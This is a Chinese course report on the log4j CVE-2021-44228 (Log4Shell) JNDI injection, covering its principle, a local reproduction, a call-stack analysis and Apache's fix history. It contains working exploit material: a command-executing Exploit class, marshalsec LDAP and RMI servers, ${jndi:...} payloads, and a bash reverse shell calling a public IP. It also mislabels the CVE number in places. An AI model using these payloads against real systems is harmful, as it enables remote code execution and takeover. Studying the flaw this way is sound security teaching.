JNDI \u67b6\u6784\u5206\u4e3a\u4e09\u5c42\uff1a JNDI API\uff1a\u4e0e Java \u5e94\u7528\u7a0b\u5e8f\u901a\u4fe1\uff0c\u63d0\u4f9b\u7f16\u7a0b\u63a5\u53e3\uff0c\u9694\u79bb\u5e94\u7528\u4e0e\u6570\u636e\u6e90 Naming Manager\uff1a\u547d\u540d\u670d\u52a1\u7ba1\u7406\u5668 JNDI SPI\uff1a\u4e0e\u5177\u4f53\u5b9e\u73b0\u65b9\u6cd5\uff08\u670d\u52a1\uff09\u76f8\u8fde\u63a5 JNDI \u652f\u6301\u7684\u670d\u52a1\u6709\u5f88\u591a\uff0c\u6bd4\u5982 RMI\u3001LDAP\u3001DNS \u7b49\u670d\u52a1\u3002JNDI \u5c01\u88c5\u4e86\u8fd9\u4e9b\u670d\u52a1\uff0c\u4f7f\u5f97\u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u7684\u4ee3\u7801\u8bbf\u95ee\u8fd9\u4e9b\u670d\u52a1\uff08\u8c03\u7528\u5bb9\u5668\u73af\u5883\u7684 Context \u7684 lookup \u65b9\u6cd5\uff09 RMI \u7b80\u4ecb \u00b6 RMI\uff08Remote Method Invocation\uff0c\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff09\u670d\u52a1\u63d0\u4f9b\u4e86\u4ece\u4e00\u4e2a JVM \u4e2d\u5bf9\u8c61\u8c03\u7528\u53e6\u4e00\u4e2a JVM \u5bf9\u8c61\u65b9\u6cd5\u7684\u65b9\u5f0f\u3002\u4e5f\u662f RPC\uff08Remote Procedure Calls\uff0c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff09\u7684\u9762\u5411\u5bf9\u8c61\u7b49\u4ef7\u670d\u52a1\u3002\u5b83\u9700\u8981\u4e00\u4e2a Server \u7aef\u63d0\u4f9b RMI \u670d\u52a1\u548c\u4e00\u4e2a Client \u7aef\u8bbf\u95ee\u8fdc\u7a0b\u63d0\u4f9b\u7684 RMI \u670d\u52a1\u3002RMI \u670d\u52a1\u5206\u4e3a\u4e09\u5c42\uff1a \u5b58\u6839\u4e0e\u9aa8\u67b6 \u5b58\u6839\uff08Stub\uff09\uff1a\u4e0e Client \u7aef\u76f8\u8fde\uff0c\u662f\u8fdc\u7a0b\u5bf9\u8c61\u7684\u4ee3\u7406 \u9aa8\u67b6\uff08Skeleton\uff09\uff1a\u4e0e Server \u7aef\u76f8\u8fde\uff0c\u4ee3\u7406\u8c03\u7528\u65b9\u6cd5 \u8fdc\u7a0b\u5f15\u7528\u5c42\uff08Remote Reference Layer\uff09\uff1a\u7528\u6765\u5bfb\u627e\u901a\u4fe1\u5bf9\u8c61\u4ee5\u53ca\u901a\u8fc7 RMI Registry \u63d0\u4f9b\u547d\u540d\u670d\u52a1 \u4f20\u8f93\u5c42\uff08Transport Layer\uff09\uff1a\u5728 Server \u4e0e Client \u7aef\u5efa\u7acb socket \u901a\u4fe1 Server \u7aef\u5f00\u542f RMI \u670d\u52a1\u65f6\u5148\u521b\u5efa\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7136\u540e\u5411 registry \u6ce8\u518c\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7b49\u5f85\u8c03\u7528\u3002Client \u7aef\u8fdb\u884c RMI \u65f6\u8bbf\u95ee registry \u5f97\u5230\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\uff0c\u518d\u901a\u8fc7\u5b58\u6839\u8fdc\u7a0b\u8c03\u7528\u65b9\u6cd5\uff0c\u5b58\u6839\u5e8f\u5217\u5316\u8c03\u7528\u540e\u4e0e\u9aa8\u67b6\u901a\u4fe1\u4f7f\u9aa8\u67b6\u4ee3\u7406\u8c03\u7528\u65b9\u6cd5\u5e76\u5c06\u7ed3\u679c\u8fd4\u56de\u7ed9\u5b58\u6839\u518d\u53cd\u5e8f\u5217\u5316\u4ea4\u7ed9\u5ba2\u6237\u7aef\u3002 LDAP \u7b80\u4ecb \u00b6 LDAP\uff08Lightweight Directory Access Protocol\uff0c\u8f7b\u578b\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09\u662f\u4e00\u4e2a\u5f00\u653e\u7684\u3001\u4e2d\u7acb\u7684\u3001\u5de5\u4e1a\u6807\u51c6\u7684\u5e94\u7528\u534f\u8bae\uff0c\u901a\u8fc7 TCP/IP \u534f\u8bae\u63d0\u4f9b\u8bbf\u95ee\u63a7\u5236\u548c\u7ef4\u62a4\u5206\u5e03\u5f0f\u4fe1\u606f\u7684\u76ee\u5f55\u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7 LDAP \u534f\u8bae\u6765\u8bbf\u95ee\u7f51\u7edc\u8d44\u6e90\uff0c\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a\u6811\u5f62\u7684\u6570\u636e\u5e93\u3002 JNDI \u6ce8\u5165\u539f\u7406 \u00b6 \u5982\u524d\u9762\u6240\u8bf4\uff0cJNDI \u5c01\u88c5\u4e86\u4e00\u4e9b\u670d\u52a1\uff0c\u5e76\u4e14\u901a\u8fc7 lookup \u6765\u8bbf\u95ee\u670d\u52a1\uff0c\u4f8b\u5982\u901a\u8fc7 lookup(\"rmi://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee ip:port \u63d0\u4f9b\u7684 RMI \u670d\u52a1\uff0c\u901a\u8fc7 lookup(\"ldap://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee LDAP \u670d\u52a1\u3002 JNDI \u7684\u76ee\u7684\u662f\u901a\u8fc7\u540d\u79f0/\u76ee\u5f55\u83b7\u53d6\u5bf9\u8c61\uff0c\u800c\u8fdc\u7a0b\u8bfb\u53d6\u7684\u4e00\u822c\u662f\u7f16\u8bd1\u540e\u7684 .class \u6587\u4ef6\u6240\u4ee5\u5728 lookup \u65f6\u4f1a\u8fdb\u884c\u7c7b\u52a0\u8f7d\uff0cJVM \u5c06\u5176\u52a0\u8f7d\u4e3a Java \u7c7b\u3002\u800c\u5f53 ClassLoader \u52a0\u8f7d .class \u6587\u4ef6\u7684\u65f6\u5019\u4f1a\u8c03\u7528\u7c7b\u7684 clinit \u65b9\u6cd5\uff0c\u6267\u884c\u7c7b\u7684\u9759\u6001\u4ee3\u7801\u3002\u56e0\u6b64\u5982\u679c\u53ef\u4ee5\u63a7\u5236 JNDI lookup \u7684 URL\uff0c\u4fbf\u53ef\u4ee5\u4efb\u610f\u52a0\u8f7d\u8fdc\u7a0b\u7c7b\uff0c\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u4e5f\u5c31\u662f JNDI \u6ce8\u5165\u539f\u7406\u3002 \u4f46\u662f JNDI \u6ce8\u5165\u53d7\u5230 JDK \u914d\u7f6e\u9650\u5236\uff0c\u5982\u679c com.sun.jndi.xxx.object.trustURLCodebase \u8fd9\u4e00\u914d\u7f6e\u662f false \u65f6\u5219\u4e0d\u4f1a\u4fe1\u4efb URL \u4ece\u800c\u65e0\u6cd5\u8fdb\u884c JNDI \u6ce8\u5165\u3002\u5728 JDK 11.0.1\u30018u191\u30017u201\u30016u211 \u7b49\u7248\u672c\u4e2d\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u662f true\uff0c\u800c\u4ece 6u132\u30017u122\u30018u113 \u5f00\u59cb\uff0c\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u4e3a false\uff08\u56e0\u6b64\u540e\u9762\u4f7f\u7528\u9ad8\u7248\u672c JDK \u590d\u73b0\u65f6\u8981\u624b\u52a8\u5f00\u542f\u8fd9\u4e00\u914d\u7f6e\uff09 CVE-2021-44228 \u6f0f\u6d1e\u539f\u7406 \u00b6 CVE-2021-44228 \u5373\u662f\u901a\u8fc7 log4j \u6765\u5b9e\u73b0\u4e86 JNDI \u6ce8\u5165\u3002log4j \u53ef\u4ee5\u901a\u8fc7 ${} \u8bed\u6cd5\u6765\u83b7\u53d6\u52a8\u6001\u5185\u5bb9\u5e76\u8f93\u51fa\u5230\u65e5\u5fd7\u4e2d\uff0c\u5176\u4e2d\u5bf9\u4e8e\u6bcf\u4e2a ${} \u90e8\u5206\u4f7f\u7528 lookup \u65b9\u6cd5\u6765\u89e3\u51b3\u53d8\u91cf\uff0c\u5176\u4e2d\u4e5f\u63d0\u4f9b\u4e86 JndiLookup\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u4f7f\u7528 JNDI \u6765\u8bfb\u53d6\u5185\u5bb9\uff0c\u5f62\u5982 ${jndi:...}\u3002\u8fd9\u65f6\u5c31\u5b58\u5728 JNDI \u6ce8\u5165\u3002 \u800c\u5927\u90e8\u5206\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u7684\u7f51\u7edc\u5e94\u7528\u90fd\u4f1a\u8bb0\u5f55\u7528\u6237\u7684\u8f93\u5165\uff0c\u6bd4\u5982\u641c\u7d22\u7f51\u7ad9\u4f1a\u8bb0\u5f55\u7528\u6237\u641c\u7d22\u7684\u5185\u5bb9\uff0c\u8fd9\u65f6\u5982\u679c\u7528\u6237\u8f93\u5165\u7684\u662f ${jndi:...}\uff08\u6bd4\u5982 ${jndi:ldap://ip:port/...}\uff09 \u5c31\u4f1a\u8fdb\u884c JndiLookup\uff0c\u5b9e\u73b0 JNDI \u6ce8\u5165\uff0c\u8fd9\u4e5f\u5c31\u662f CVE-2021-44228 \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u539f\u7406\u3002 log4j \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4e0b\u9762\u5206\u522b\u901a\u8fc7\u8c03\u7528 LDAP \u548c RMI \u670d\u52a1\u7684\u65b9\u5f0f\u6765\u590d\u73b0\u8fd9\u4e00 JNDI \u6ce8\u5165\u6f0f\u6d1e\u3002 LDAP \u5b9e\u73b0 \u00b6 \u8fdb\u884c\u8fd9\u4e00\u6f0f\u6d1e\u7684\u590d\u73b0\u9700\u8981\u4ee5\u4e0b\u4e24\u4e2a\u90e8\u5206\uff1a \u4e00\u4e2a LDAP \u670d\u52a1\uff0c\u7528\u6765\u91cd\u5b9a\u5411\u63d0\u4f9b\u653b\u51fb\u7c7b \u9700\u8981\u4e00\u4e2a\u7f51\u7edc\u670d\u52a1\u6765\u4e3a\u5176\u63d0\u4f9b\u653b\u51fb\u7c7b \u4e00\u4e2a\u5305\u542b\u5b58\u5728\u6f0f\u6d1e\u7684 log4j \u7ec4\u4ef6\u7684 Java \u5e94\u7528 \u653b\u51fb\u7c7b \u00b6 \u9996\u5148\u662f\u7528\u4e8e\u53d1\u8d77\u653b\u51fb\u7684 Exploit \u7c7b\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a public class Exploit { static { try { String [] cmds = { \"open\" , \"/System/Applications/Calculator.app\" }; java . lang . Runtime . getRuntime (). exec ( cmds ). waitFor (); } catch ( Exception e ) { e . printStackTrace (); } } } \u4f7f\u7528 javac Exploit.java \u5c06\u8fd9\u4e2a\u7c7b\u7f16\u8bd1\u4e3a .class \u7c7b\u6587\u4ef6\uff0c\u7136\u540e\u4f7f\u7528 python -m http.server 8888 \u4e3a\u5f53\u524d\u76ee\u5f55\u5728 8888 \u7aef\u53e3\u5f00\u542f\u4e00\u4e2a HTTP \u670d\u52a1\u3002\u53ef\u4ee5\u901a\u8fc7 curl -I 127.0.0.1:8888/Exploit.class \u6765\u68c0\u67e5\u662f\u5426\u6b63\u5e38\u90e8\u7f72\uff0c\u80fd\u5426\u83b7\u53d6\u5230\u5f53\u524d Exploit \u7c7b\u6587\u4ef6\u3002 LDAP \u670d\u52a1 \u00b6 \u4f7f\u7528 marshalsec \u63d0\u4f9b\u7684\u5de5\u5177\u6765\u76f4\u63a5\u642d\u5efa LDAP \u670d\u52a1 git clone https://github.com/mbechler/marshalsec.git cd marshalsec mvn clean package -DskipTests # \u901a\u8fc7 maven \u6784\u5efa java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \\ marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8888/#Exploit\" \u8fd9\u4e2a LDAP \u670d\u52a1\u76f4\u63a5\u63d0\u4f9b\u4e86\u5bf9 8888 \u7aef\u53e3\u4e2d\u7684 Exploit \u7c7b\u6587\u4ef6\u7684\u91cd\u5b9a\u5411\u8bbf\u95ee\uff0c\u7aef\u53e3\u5728\u9ed8\u8ba4\u7684 1389\u3002 log4j \u6f0f\u6d1e\u5e94\u7528 \u00b6 \u7f16\u5199\u4e00\u4e2a\u53ea\u8c03\u7528\u4e86 log4j \u8bb0\u5f55 ${jndi:ldap://127.0.0.1:1389/Exploit} \u7684\u7c7b\uff08\u8fd9\u4e2a payload \u4e00\u822c\u662f\u7531\u7528\u6237\u8f93\u5165\u83b7\u53d6\u7684\uff0c\u4f46\u8fd9\u91cc\u65b9\u4fbf\u590d\u73b0\u76f4\u63a5\u786c\u7f16\u7801\u5230\u6f0f\u6d1e\u5e94\u7528\u4e2d\u4e86\uff0c\u4e8c\u8005\u672c\u8d28\u662f\u4e00\u6837\u7684\uff09\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a import org.apache.logging.log4j.LogManager ; import org.apache.logging.log4j.Logger ; public class log4j { private static final Logger logger = LogManager . getLogger ( log4j . class ); public static void main ( String [] args ) { System . setProperty ( \"com.sun.jndi.ldap.object.trustURLCodebase\" , \"true\" ); logger . error ( \"${jndi:ldap://127.0.0.1:1389/Exploit}\" ); } } \u6ce8\u610f\u56e0\u4e3a\u662f\u9ad8\u7248\u672c JDK\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u5f00\u542f com.sun.jndi.ldap.object.trustURLCodebase \u9009\u9879\u3002 \u590d\u73b0\u653b\u51fb \u00b6 \u524d\u9762\u5df2\u7ecf\u6b63\u5e38\u5f00\u542f\u4e86 LDAP \u670d\u52a1\uff0c\u6240\u4ee5\u6f0f\u6d1e\u5e94\u7528\u8fd0\u884c\u65f6\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u5230 Exploit \u7c7b\uff0c\u6267\u884c\u5176\u4e2d\u9759\u6001\u4ee3\u7801\u3002\u56e0\u4e3a\u5176\u4e2d\u901a\u8fc7 exec \u6267\u884c\u4e86 open /System/Applications/Calculator.app \u547d\u4ee4\uff0c\u6240\u4ee5\u4f1a\u5f39\u51fa\u8ba1\u7b97\u5668\u5e94\u7528\u3002 \u53ef\u4ee5\u770b\u5230 LDAP \u670d\u52a1\u7aef\u8f93\u51fa\u4e86\u4e00\u6761\u53d1\u9001 LDAP \u5f15\u7528\u7684\u8bed\u53e5\uff0c\u8bf4\u660e log4j \u5e94\u7528\u786e\u5b9e\u8fde\u63a5\u4e86 LDAP \u670d\u52a1\u7aef\u5e76\u83b7\u53d6\u4e86 Exploit.class \u7c7b\u6587\u4ef6\u3002\u800c\u4e14\u56e0\u4e3a\u5176\u4e2d\u7684\u9759\u6001\u4ee3\u7801\u901a\u8fc7 exec \u6267\u884c\u4e86 open /System/Applications/Calculator.app \u547d\u4ee4\uff0c\u6240\u4ee5\u770b\u5230\u5f39\u51fa\u4e86\u8ba1\u7b97\u5668\uff0c\u8bf4\u660e\u4e86\u8fd9\u4e2a\u9759\u6001\u4ee3\u7801\u786e\u5b9e\u88ab\u6267\u884c\u4e86\u3002\u8fd9\u4e5f\u5c31\u590d\u73b0\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u3002 \u63a5\u4e0b\u6765\u66f4\u6362\u4e00\u4e0b exec \u6267\u884c\u7684\u547d\u4ee4\uff0c\u6765\u5b9e\u73b0\u53cd\u5f39\u7ec8\u7aef\u3002 \u9996\u5148\u5728\u8fdc\u7a0b\u516c\u7f51\u670d\u52a1\u5668\uff08ip \u662f 47.103.43.32\uff09\u901a\u8fc7 nc -lnvvp 7777 \u5728 7777 \u7aef\u53e3\u76d1\u542c\uff0c\u7528\u6765\u6355\u83b7\u53cd\u5f39\u7684\u7ec8\u7aef\u3002\u7136\u540e\u66f4\u6539\u653b\u51fb\u7c7b\u4ee3\u7801\uff1a String [] cmds = { \"/bin/bash\" , \"-c\" , \"bash -i >& /dev/tcp/47.103.43.32/7777 0>&1\" }; java . lang . Runtime . getRuntime (). exec ( cmds ). waitFor (); \u5373\u901a\u8fc7 /dev/tcp \u8bbe\u5907\u5c06 bash \u7684\u8f93\u5165\u8f93\u51fa\u6d41\u91cd\u5b9a\u5411\u5230\u516c\u7f51\u670d\u52a1\u5668\u4e0a\uff0c\u5b9e\u73b0 get shell\u3002\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\uff1a \u7531\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u5df2\u7ecf\u8fde\u63a5\u4e0a\u4e86\u5f53\u524d\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\u7684 macOS \u4e3b\u673a\u3002 \u8c03\u7528\u6808\u5206\u6790 \u00b6 \u901a\u8fc7\u8c03\u8bd5\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\u53ef\u4ee5\u83b7\u53d6\u5230\u6574\u4e2a\u7a0b\u5e8f\u7684\u8c03\u7528\u6808\uff1a < clinit > : 11 , Exploit forName0 : - 1 , Class ( java . lang ) forName : 348 , Class ( java . lang ) loadClass : 91 , VersionHelper12 ( com . sun . naming . internal ) loadClass : 101 , VersionHelper12 ( com . sun . naming . internal ) loadClass : 115 , VersionHelper12 ( com . sun . naming . internal ) getObjectFactoryFromReference : 163 , NamingManager ( javax . naming . spi ) getObjectInstance : 189 , DirectoryManager ( javax . naming . spi ) c_lookup : 1114 , LdapCtx ( com . sun . jndi . ldap ) p_lookup : 542 , ComponentContext ( com . sun . jndi . toolkit . ctx ) lookup : 177 , PartialCompositeContext ( com . sun . jndi . toolkit . ctx ) lookup : 205 , GenericURLContext ( com . sun . jndi . toolkit . url ) lookup : 94 , ldapURLContext ( com . sun . jndi . url . ldap ) lookup : 417 , InitialContext ( javax . naming ) lookup : 172 , JndiManager ( org . apache . logging . log4j . core . net ) lookup : 56 , JndiLookup ( org . apache . logging . log4j . core . lookup ) lookup : 221 , Interpolator ( org . apache . logging . log4j . core . lookup ) resolveVariable : 1110 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) substitute : 1033 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) substitute : 912 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) replace : 467 , StrSubstitutor ( org . apache . logging . log4j . core . lookup ) format : 132 , MessagePatternConverter ( org . apache . logging . log4j . core . pattern ) format : 38 , PatternFormatter ( org . apache . logging . log4j . core . pattern ) toSerializable : 344 , PatternLayout$PatternSerializer ( org . apache . logging . log4j . core . layout ) toText : 244 , PatternLayout ( org . apache . logging . log4j . core . layout ) encode : 229 , PatternLayout ( org . apache . logging . log4j . core . layout ) encode : 59 , PatternLayout ( org . apache . logging . log4j . core . layout ) directEncodeEvent : 197 , AbstractOutputStreamAppender ( org . apache . logging . log4j . core . appender ) tryAppend : 190 , AbstractOutputStreamAppender ( org . apache . logging . log4j . core . appender ) append : 181 , AbstractOutputStreamAppender ( org . apache . logging . log4j . core . appender ) tryCallAppender : 156 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppender0 : 129 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppenderPreventRecursion : 120 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppender : 84 , AppenderControl ( org . apache . logging . log4j . core . config ) callAppenders : 540 , LoggerConfig ( org . apache . logging . log4j . core . config ) processLogEvent : 498 , LoggerConfig ( org . apache . logging . log4j . core . config ) log : 481 , LoggerConfig ( org . apache . logging . log4j . core . config ) log : 456 , LoggerConfig ( org . apache . logging . log4j . core . config ) log : 63 , DefaultReliabilityStrategy ( org . apache . logging . log4j . core . config ) log : 161 , Logger ( org . apache . logging . log4j . core ) tryLogMessage : 2205 , AbstractLogger ( org . apache . logging . log4j . spi ) logMessageTrackRecursion : 2159 , AbstractLogger ( org . apache . logging . log4j . spi ) logMessageSafely : 2142 , AbstractLogger ( org . apache . logging . log4j . spi ) logMessage : 2017 , AbstractLogger ( org . apache . logging . log4j . spi ) logIfEnabled : 1983 , AbstractLogger ( org . apache . logging . log4j . spi ) error : 740 , AbstractLogger ( org . apache . logging . log4j . spi ) main : 11 , log4j \u53ef\u4ee5\u8f83\u6e05\u6670\u5730\u5206\u6790\u51fa\u6765\u7a0b\u5e8f\u8fdb\u5165\u6267\u884c logger.error\uff0c\u7136\u540e\u5728 log \u4e2d\u9010\u5c42\u8c03\u7528\u6700\u7ec8\u8c03\u7528\u5230 resolveVariable \u5373\u5904\u7406 ${} \u53d8\u91cf\uff0c\u7136\u540e\u8c03\u7528\u5230\u4e86 Interpolator \u7684 lookup \u65b9\u6cd5\uff0c\u5176\u4e2d\u5bfb\u627e\u5230\u4e86 JndiLookup \u7c7b\uff0c\u8c03\u7528\u5176 lookup \u65b9\u6cd5\uff0c\u4ece LDAP \u670d\u52a1\u83b7\u53d6\u7c7b\uff0c\u7136\u540e\u4ece\u4e2d getObjectInstance\uff0c\u8fd9\u91cc\u4f1a\u8fdb\u884c loadClass \u64cd\u4f5c\uff0c\u800c\u5176\u4e2d\u8c03\u7528\u4e86 Exploit \u7c7b\u9690\u85cf\u7684 clinit \u65b9\u6cd5\u4e5f\u5c31\u662f\u9759\u6001\u4ee3\u7801\uff0c\u9020\u6210 RCE\u3002 RMI \u5b9e\u73b0 \u00b6 RMI \u7684\u5b9e\u73b0\u7c7b\u4f3c LDAP\uff0cExploit \u7c7b\u540c\u6837\u4f7f\u7528\u8c03\u7528\u8ba1\u7b97\u5668\u7684\u4ee3\u7801\uff0c\u901a\u8fc7 python \u5f00\u542f HTTP \u670d\u52a1\u63d0\u4f9b\u7ed9 RMI\u3002\u7136\u540e\u540c\u6837\u901a\u8fc7 marshalsec \u6765\u642d\u5efa RMI \u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3\u5728 1099\uff09\uff1a java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \\ marshalsec.jndi.RMIRefServer \"http://127.0.0.1:8888/#Exploit\" \u7565\u4fee\u6539\u4e00\u4e0b log4j \u6f0f\u6d1e\u5e94\u7528\uff0c\u4f7f\u4e4b\u8bb0\u5f55 ${jndi:rmi://127.0.0.1:1099/Exploit}\uff1a import org.apache.logging.log4j.LogManager ; import org.apache.logging.log4j.Logger ; public class log4j { private static final Logger logger = LogManager . getLogger ( log4j . class ); public static void main ( String [] args ) { System . setProperty ( \"com.sun.jndi.rmi.object.trustURLCodebase\" , \"true\" ); System . setProperty ( \"com.sun.jndi.ldap.object.trustURLCodebase\" , \"true\" ); logger . error ( \"${jndi:rmi://127.0.0.1:1099/Exploit}\" ); } } \u8fd0\u884c\u53d1\u73b0\u8ba1\u7b97\u5668\u5df2\u88ab\u8c03\u51fa\uff1a log4j \u6f0f\u6d1e\u4fee\u590d \u00b6 \u9ad8\u7248\u672c\u7684 JDK \u4e2d\u8bbe\u7f6e\u4e86 com.sun.jndi.xxx.object.trustURLCodebase \u9ed8\u8ba4\u4e3a false\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u4e00\u90e8\u5206 JNDI \u6ce8\u5165\u7684\u53d1\u751f\u3002 \u5728 CVE-2021-42288 \u53d1\u5e03\u540e\uff0cApache \u901a\u8fc7 #608 \u8fd9\u4e2a pull request \u6765\u5bf9 LDAP \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u5e76\u53d1\u5e03\u4e86 2.15.0-rc1 \u7248\u672c\u3002\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u5b58\u5728\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u5373\u901a\u8fc7\u6784\u9020\u51fa\u4f1a\u629b\u51fa\u5f02\u5e38\u7684 payload \u5c31\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u9a8c\u3002 \u968f\u540e Apache \u53c8\u8fdb\u884c\u4e86\u5bf9\u4e8e\u5f02\u5e38 URI \u7684\u5904\u7406\uff0c\u53d1\u5e03\u4e86 2.15.0-rc2 \u7248\u672c\uff0c\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u4f1a\u901a\u8fc7\u8f83\u590d\u6742\u7684\u7ed5\u8fc7\u5b9e\u73b0 RCE\u3002\u56e0\u6b64\u5728 2.16.0-rc1 \u7248\u672c\u4e2d\uff0cMessage Lookups \u88ab\u5f7b\u5e95\u5220\u9664\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u88ab\u89e6\u53d1\u7684\u60c5\u51b5\u5c31\u66f4\u5c11\u4e86\uff0c\u4f46\u5982\u679c\u5f00\u53d1\u8005\u624b\u52a8\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u4ecd\u6709\u53ef\u80fd\u901a\u8fc7\u4e00\u7cfb\u5217\u7ed5\u8fc7\u5b9e\u73b0\u6ce8\u5165\u3002 \u4f46\u662f\u5728 2.16.0 \u7248\u672c\u4e2d\u5982\u679c\u6ca1\u6709\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u53cc\u5c42\u5d4c\u5957\u7684 ${${...}} \u4f1a\u5bfc\u81f4\u65e0\u9650\u9012\u5f52\uff0c\u4ece\u800c\u9020\u6210 DoS \u653b\u51fb\uff0c\u8fd9\u4e5f\u5c31\u662f\u540e\u7eed\u7684 CVE-2021-45046 \u8fd9\u4e2a\u6f0f\u6d1e\u3002\u968f\u540e\u5728 2.17.0 \u7248\u672c\u4e2d Apache \u4fee\u590d\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5e76\u4e14\u9650\u5236\u5373\u4f7f\u5f00\u542f\u4e86 JNDI \u529f\u80fd\uff0c\u5176\u4ec5\u652f\u6301 java \u534f\u8bae\u800c\u4e0d\u652f\u6301 ldap\uff0c2.15.0-rc2 \u548c 2.16.0 \u4e2d\u7684\u7ed5\u8fc7\u4e5f\u65e0\u6548\u4e86\u3002\u56e0\u6b64 2.17.0 \u4e5f\u5c31\u6210\u4e3a\u4e86\u53ef\u4ee5\u5b8c\u5168\u9632\u6b62\u8fd9\u4e00\u6f0f\u6d1e\u7684 log4j \u7248\u672c\u4e86\u3002 Reference \u00b6 CVE-2021-42288. https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228 NVD, CVE-2021-44228 Detail. https://nvd.nist.gov/vuln/detail/CVE-2021-44228 Apache Log4j Security Vulnerabilities. https://logging.apache.org/log4j/2.x/security.html \u3010\u6f0f\u6d1e\u901a\u544a\u3011Apache Log4j2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2021-44228/CVE-2021-45046\uff09. https://help.aliyun.com/noticelist/articleid/1060971232.html Free Wortley, et al., Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package. https://www.lunasec.io/docs/blog/log4j-zero-day/ tangxiaofeng7, CVE-2021-44228-Apache-Log4j-Rce. https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce mbechler, marshalsec toolchain. https://github.com/mbechler/marshalsec log4j \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u539f\u7406\u53ca\u4fee\u590d\u65b9\u6848. https://zhuanlan.zhihu.com/p/444140910 JNDI \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u539f\u7406\u5206\u6790\u53ca\u89e3\u51b3\u65b9\u6848. https://zhuanlan.zhihu.com/p/447220806 Java Tutorials, Overview of JNDI. https://docs.oracle.com/javase/tutorial/jndi/overview/index.html Java Tutorials, An Overview of RMI Applications. https://docs.oracle.com/javase/tutorial/rmi/overview.html TutorialsPoint, Java RMI - Introduction. https://www.tutorialspoint.com/java_rmi/java_rmi_introduction.htm Java \u4e2d RMI \u7684\u4f7f\u7528. https://cloud.tencent.com/developer/article/1824106 Pickle, \u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff08RMI\uff09\u539f\u7406\u4e0e\u793a\u4f8b. https://www.cnblogs.com/wxisme/p/5296441.html Authing \u8eab\u4efd\u4e91, LDAP \u534f\u8bae\u5165\u95e8\uff08\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09. https://zhuanlan.zhihu.com/p/147768058 JNDI \u6ce8\u5165\u539f\u7406\u53ca\u5229\u7528. https://xz.aliyun.com/t/6633#toc-7 hldfight, log4j \u5b98\u65b9\u6f0f\u6d1e\u4fee\u590d\u53f2. https://blog.csdn.net/qsort_/article/details/122101423 rgoers, Restrict LDAP access via JNDI. https://github.com/apache/logging-log4j2/pull/608 LOG4J2-3211 - Remove Messge Lookups. https://github.com/apache/logging-log4j2/pull/623 \u4ece\u96f6\u5230\u4e00\u5e26\u4f60\u6df1\u5165 log4j2 Jndi RCE CVE-2021-44228 \u6f0f\u6d1e - 2.15.0 rc1\u7ed5\u8fc7\u8be6\u89e3. https://paper.seebug.org/1789/#0x06-2150-rc1 4ra1n, \u6d45\u8c08 Log4j2 \u4e4b 2.15.0 \u7248\u672c RCE. https://xz.aliyun.com/t/10689","title":"log4j \u6f0f\u6d1e\u590d\u73b0"},{"location":"cs/web/log4j_vuln/#log4j","text":"Abstract \u8fd9\u7bc7\u662f\u6d59\u6c5f\u5927\u5b66 \u201c\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5bfc\u8bba\u201d\uff08\u5927\u4e00\u6625\u590f\uff09\u7684\u8bfe\u7a0b\u62a5\u544a \u4ecb\u7ecd\u4e86 log4j \u53ca\u7531\u5176\u5f15\u53d1\u7684 CVE-2021-44228 \u6f0f\u6d1e\uff0c\u5e76\u4ece 